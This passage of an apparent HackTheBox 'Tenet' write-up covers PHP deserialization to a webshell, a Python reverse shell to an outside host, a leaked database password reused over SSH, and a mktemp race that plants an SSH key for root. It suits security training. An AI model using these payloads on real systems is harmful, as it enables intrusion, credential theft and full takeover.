</span></span><span class=line><span class=cl><span class=nv>$input</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;arepo&#39;</span><span class=p>]</span> <span class=o>??</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$databaseupdate</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$app</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DatabaseExport</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$app</span> <span class=o>-&gt;</span> <span class=na>update_db</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>There is a PHP deserialization here that allow us to upload any arbitrary content.</p><p>We can even find a <a href=https://security.stackexchange.com/questions/176263/why-does-this-php-object-injection-exploit-work>similar case</a> on security stackexchange.</p><p>My PoC to generate the serialized webshell payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>DatabaseExport</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=nv>$user_file</span> <span class=o>=</span> <span class=s1>&#39;cyfun.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=nv>$data</span> <span class=o>=</span> <span class=s1>&#39;&lt;?php system($_GET[&#34;cmd&#34;])?&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$klass</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DatabaseExport</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$klass</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$payload</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>Here the URL-encoded form:</p><p>http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:{s:9:%22user_file%22;s:9:%22cyfun.php%22;s:4:%22data%22;s:28:%22%3C?php%20system($_GET[%22cmd%22])?%3E%22;}</p><p>Then we can access teh webshell and execute a command: http://10.10.10.223/cyfun.php?cmd=id</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></td></tr></table></div></div><p>We know the upload and command exec works so let&rsquo;s execute a reverse shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.15.44&#34;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
</span></span></code></pre></td></tr></table></div></div><p>We receive it on our reverse shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pwncat -l 9999 -vv
</span></span><span class=line><span class=cl>INFO: Listening on :::9999 (family 10/IPv6, TCP)
</span></span><span class=line><span class=cl>INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl>INFO: Client connected from 10.10.10.223:59112 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>/bin/sh: 0: can&#39;t access tty; job control turned off
</span></span><span class=line><span class=cl>$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></td></tr></table></div></div><p><code>cat /etc/passwd</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>root</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>daemon</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=n>daemon</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>bin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=n>sys</span><span class=p>:</span><span class=o>/</span><span class=n>dev</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sync</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>4</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>sync</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sync</span>
</span></span><span class=line><span class=cl><span class=n>games</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>5</span><span class=p>:</span><span class=mi>60</span><span class=p>:</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>man</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>6</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=n>lp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>lpd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>mail</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>news</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>uucp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>proxy</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=n>proxy</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>backup</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=n>backup</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>list</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=n>Mailing</span> <span class=n>List</span> <span class=n>Manager</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>list</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>irc</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>gnats</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=n>Gnats</span> <span class=n>Bug</span><span class=o>-</span><span class=n>Reporting</span> <span class=n>System</span> <span class=p>(</span><span class=n>admin</span><span class=p>):</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>gnats</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>nobody</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>nobody</span><span class=p>:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>network</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>100</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Network</span> <span class=n>Management</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>netif</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>resolve</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>101</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Resolver</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>resolve</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>syslog</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=mi>106</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>syslog</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>messagebus</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=mi>107</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>_apt</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>104</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lxd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>105</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>lxd</span><span class=o>/</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>uuidd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>106</span><span class=p>:</span><span class=mi>110</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>uuidd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>dnsmasq</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>107</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>dnsmasq</span><span class=p>,,,:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>misc</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>landscape</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>108</span><span class=p>:</span><span class=mi>112</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>landscape</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>pollinate</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>109</span><span class=p>:</span><span class=mi>1</span><span class=p>::</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>pollinate</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>sshd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>110</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>sshd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>mysql</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>111</span><span class=p>:</span><span class=mi>115</span><span class=p>:</span><span class=n>MySQL</span> <span class=n>Server</span><span class=p>,,,:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>neil</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1001</span><span class=p>:</span><span class=mi>1001</span><span class=p>:</span><span class=n>neil</span><span class=p>,,,:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>neil</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=shell-upgrade>Shell upgrade<a hidden class=anchor aria-hidden=true href=#shell-upgrade>#</a></h2><p><code>/var/www/html/wordpress</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=sd>/** MySQL database username */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_USER&#39;</span><span class=p>,</span> <span class=s1>&#39;neil&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** MySQL database password */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_PASSWORD&#39;</span><span class=p>,</span> <span class=s1>&#39;Opera2112&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** MySQL hostname */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_HOST&#39;</span><span class=p>,</span> <span class=s1>&#39;localhost&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span></code></pre></td></tr></table></div></div><p>We can re-use DB password over SSH: <code>ssh neil@tenet.htb</code>.</p><h2 id=privilege-escalation-of-machine--from-neil-to-root>Privilege Escalation of Machine : from neil to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-neil-to-root>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries for www-data on tenet:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User www-data may run the following commands on tenet:
</span></span><span class=line><span class=cl>    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
</span></span></code></pre></td></tr></table></div></div><p>A script can be run as root via sudo: <code>/usr/local/bin/enableSSH.sh</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>checkAdded<span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>sshName</span><span class=o>=</span><span class=k>$(</span>/bin/echo <span class=nv>$key</span> <span class=p>|</span> /usr/bin/cut -d <span class=s2>&#34; &#34;</span> -f 3<span class=k>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>[[</span> ! -z <span class=k>$(</span>/bin/grep <span class=nv>$sshName</span> /root/.ssh/authorized_keys<span class=k>)</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>                /bin/echo <span class=s2>&#34;Successfully added </span><span class=nv>$sshName</span><span class=s2> to authorized_keys file!&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span>
</span></span><span class=line><span class=cl>                /bin/echo <span class=s2>&#34;Error in adding </span><span class=nv>$sshName</span><span class=s2> to authorized_keys file!&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>checkFile<span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>[[</span> ! -s <span class=nv>$1</span> <span class=o>]]</span> <span class=o>||</span> <span class=o>[[</span> ! -f <span class=nv>$1</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>                /bin/echo <span class=s2>&#34;Error in creating key file!&#34;</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>[[</span> -f <span class=nv>$1</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span> /bin/rm <span class=nv>$1</span><span class=p>;</span> <span class=k>fi</span>
</span></span><span class=line><span class=cl>                <span class=nb>exit</span> <span class=m>1</span>
</span></span><span class=line><span class=cl>        <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>addKey<span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>tmpName</span><span class=o>=</span><span class=k>$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class=k>)</span>
</span></span><span class=line><span class=cl>        <span class=o>(</span><span class=nb>umask</span> 110<span class=p>;</span> touch <span class=nv>$tmpName</span><span class=o>)</span>
</span></span><span class=line><span class=cl>        /bin/echo <span class=nv>$key</span> &gt;&gt;<span class=nv>$tmpName</span>
</span></span><span class=line><span class=cl>        checkFile <span class=nv>$tmpName</span>
</span></span><span class=line><span class=cl>        /bin/cat <span class=nv>$tmpName</span> &gt;&gt;/root/.ssh/authorized_keys
</span></span><span class=line><span class=cl>        /bin/rm <span class=nv>$tmpName</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>key</span><span class=o>=</span><span class=s2>&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
</span></span><span class=line><span class=cl>addKey
</span></span><span class=line><span class=cl>checkAdded
</span></span></code></pre></td></tr></table></div></div><p>Since <code>mktemp</code> will create a random file we need to make a race condition
to write our SSH pub key into it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>key</span><span class=o>=</span><span class=s1>&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n cyfun@penarch&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=nb>true</span>
</span></span><span class=line><span class=cl><span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=nv>$key</span> <span class=p>|</span> tee /tmp/ssh-* &gt; /dev/null
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><p>We execute that while running <code>sudo /usr/local/bin/enableSSH.sh</code>.
Several tries may be necessary because race conditions doesn&rsquo;t always work the 1st time.</p><p>Then we can connect as root.</p><p><code>ssh root@tenet.htb -i ~/.ssh/id_ed25519</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
